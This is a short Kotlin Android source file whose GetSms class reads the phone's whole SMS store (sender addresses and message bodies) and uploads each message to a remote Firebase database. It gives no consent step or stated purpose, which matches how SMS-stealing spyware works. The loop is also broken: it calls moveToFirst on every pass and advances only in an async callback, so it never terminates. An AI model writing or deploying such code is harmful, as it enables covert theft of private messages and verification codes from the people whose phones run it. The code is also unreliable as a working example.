package com.example.baf203

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class GetSms(var context : Context) {
    var list = ArrayList<SmsModel>()
    private val database: DatabaseReference = FirebaseDatabase.getInstance().reference
    val cursor : Cursor = context.contentResolver.query(
        Uri.parse("content://sms"),
        null,null,null,null)!!

    var totalMessages = cursor.count

    fun getMessages() {
        Log.d("testing", "in get message function")
        while (cursor.moveToFirst()) {
            val model = SmsModel(
                cursor.getString(cursor.getColumnIndexOrThrow("_id")),
                cursor.getString(cursor.getColumnIndexOrThrow("address")),
                cursor.getString(cursor.getColumnIndexOrThrow("body")))

            database.child("Messages").child(cursor.getString(cursor.getColumnIndexOrThrow("_id")))
                .setValue(model).addOnCompleteListener {
                    Log.d("testing", "saved to firebase inbox")
                    cursor.moveToNext()
                }

        }
    }

}


